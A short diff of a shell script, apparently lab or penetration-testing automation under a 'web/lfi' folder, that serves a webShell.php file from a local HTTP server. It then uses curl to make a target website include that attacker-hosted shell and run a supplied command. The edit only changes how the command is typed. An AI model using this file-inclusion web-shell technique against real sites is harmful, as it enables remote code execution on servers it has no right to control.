@@ -20,8 +20,8 @@ cd "${SCRIPTS_DIR}/web/lfi/.files"
 python3 -m http.server ${PORT} &
 HTTP_PID=$!
 
-paste_command "curl -ks '${WEBSITE}http://${KALI_IP}:${PORT}/webShell.php&cmd=${CMD}'"
-xdotool key Return
+execute_command "curl -ks '${WEBSITE}http://${KALI_IP}:${PORT}/webShell.php&cmd=${CMD}'"
+create_new_line
 sleep 60
 
 kill $HTTP_PID
